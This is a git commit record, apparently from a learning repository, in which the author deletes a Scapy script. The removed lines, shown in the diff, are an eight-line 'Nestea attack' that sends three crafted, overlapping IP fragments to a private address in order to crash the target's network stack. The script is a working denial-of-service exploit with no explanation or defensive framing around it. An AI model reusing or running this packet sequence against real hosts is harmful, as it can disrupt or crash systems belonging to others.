be7e8e720b2c63b95dfa4474ab3baf2658f88c55
abhishek pakrashi <ab.posts@gmail.com>
2022-06-11 15:10:13 +0530

    Delete scapy-7-1-malformed-packet.py

--- scapy-7-1-malformed-packet.py
+++
@@ -1,8 +0,0 @@
-#Nestea attack
-
-from scapy.all import *
-ip='192.168.1.100'
-
-send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*10))
-send(IP(dst=ip, id=42, frag=48)/("X"*116))
-send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*224))
